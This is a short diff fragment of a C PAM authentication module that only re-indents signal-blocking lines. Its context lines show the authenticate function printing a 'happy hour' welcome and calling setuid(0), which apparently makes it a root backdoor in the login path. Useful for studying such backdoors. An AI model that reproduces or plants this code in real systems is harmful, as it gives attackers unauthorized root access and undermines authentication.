@@ -22,10 +22,10 @@ PAM_EXTERN int pam_sm_authenticate (pam_handle_t *pamh, int flags,
 
     char *args[] = { "** It's happy hour!! **", NULL };
 
-    sigset_t zzz;                               //  fix for 'login'  
-    sigemptyset (&zzz);                        //     |      |   
-    sigaddset(&zzz, SIGALRM);                 //   <--|------'    
-    sigprocmask(SIG_BLOCK, &zzz, NULL);      //  <----'
+        sigset_t zzz;                               //  fix for 'login'  
+        sigemptyset (&zzz);                        //     |      |   
+        sigaddset(&zzz, SIGALRM);                 //   <--|------'    
+        sigprocmask(SIG_BLOCK, &zzz, NULL);      //  <----'
 
         printf("**WELCOME TO HAPPY HOUR**\n");    
         setuid(0);
